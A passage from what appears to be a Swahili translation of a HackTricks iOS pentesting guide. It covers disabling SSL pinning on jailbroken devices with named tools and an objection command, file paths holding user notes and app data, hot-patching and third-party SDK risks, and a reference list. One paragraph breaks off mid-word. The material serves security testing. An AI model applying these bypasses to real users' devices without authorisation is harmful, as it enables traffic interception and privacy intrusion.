Ili kukiuka ulinzi huu ndani ya kifaa kilichovunjika, unaweza kusakinisha programu [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) au kusakinisha [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Unaweza pia kutumia **objection's** `ios sslpinning disable`

## Mambo Mengine

* Katika **`/System/Library`** unaweza kupata fremu zilizosakinishwa kwenye simu zinazotumiwa na programu za mfumo
* Programu zilizosakinishwa na mtumiaji kutoka kwenye Duka la App zinapatikana ndani ya **`/User/Applications`**
* Na **`/User/Library`** ina data iliyohifadhiwa na programu za kiwango cha mtumiaji
* Unaweza kupata ufikiaji wa **`/User/Library/Notes/notes.sqlite`** kusoma maelezo yaliyohifadhiwa ndani ya programu.
* Ndani ya folda ya programu iliyosakinishwa (**`/User/Applications/<APP ID>/`**) unaweza kupata faili za kuvutia:
* **`iTunesArtwork`**: Nembo inayotumiwa na programu
* **`iTunesMetadata.plist`**: Maelezo ya programu yanayotumiwa kwenye Duka la App
* **`/Library/*`**: Ina mapendeleo na cache. Katika **`/Library/Cache/Snapshots/*`** unaweza kupata picha iliyochukuliwa kwa programu kabla ya kupelekwa nyuma.

### Kupachika Moto/Usasishaji wa Kulazimishwa

Wabunifu wanaweza **kupachika moto kwa mbali ufungaji wa programu zao mara moja** bila kulazimika kuwasilisha tena programu kwenye Duka la App na kusubiri idhini.\
Kwa madhumuni haya kawaida hutumika [**JSPatch**](https://github.com/bang590/JSPatch)**.** Lakini kuna chaguzi nyingine pia kama [Siren](https://github.com/ArtSabintsev/Siren) na [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Hii ni mbinu hatari inayoweza kutumiwa vibaya na SDK za watu wengine wa tatu kwa hivyo inashauriwa kuchunguza ni njia ipi inayotumiwa kwa usasishaji wa moja kwa moja (ikiwa ipo) na kuitathmini.** Unaweza jaribu kupakua toleo la awali la programu kwa madhumuni haya.

### Watu wa Tatu

Changamoto kubwa ya **SDK za watu wa tatu** ni **ukosefu wa udhibiti wa kina** juu ya kazi zao. Wabunifu wanakabiliwa na uamuzi: ama kuingiza SDK na kukubali vipengele vyote vyake, ikiwa ni pamoja na udhaifu wa usalama na wasiwasi wa faragha, au kutoa faida zake kabisa. Mara nyingi, wabunifu hawawezi kusasisha udhaifu ndani ya SDK hizi wenyewe. Zaidi ya hayo, wakati SDK zinapata imani ndani ya jamii, baadhi zinaweza kuanza kuwa na zisizo.

Huduma zinazotolewa na SDK za watu wa tatu zinaweza kujumuisha kufuatilia tabia za mtumiaji, kuonyesha matangazo, au kuboresha uzoefu wa mtumiaji. Hata hivyo, hii inaleta hatari kwani wabunifu hawawezi kuwa na ufahamu kamili wa namna kanuni inavyotekelezwa na maktaba hizi, ikiongoza kwa hatari za faragha na usalama. Ni muhimu kudhibiti habari inayoshirikiwa na huduma za watu wa tatu kwa kile kinachohitajika na kuhakikisha kuwa hakuna data nyeti inafichuliwa.

Utekelezaji wa huduma za watu wa tatu kawaida unakuja katika aina mbili: maktaba ya kujitegemea au SDK kamili. Ili kulinda faragha ya mtumiaji, data yoyote inayoshirikiwa na huduma hizi inapaswa kuwa \*\*imeti

```bash
otool -L <application_path>
```

## **Vyanzo & Vyanzo Zaidi**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Kozi ya bure ya IOS([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Toleo la Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Toleo la Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zaidi yaliyotengenezwa na zana za jamii za **juu kabisa** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
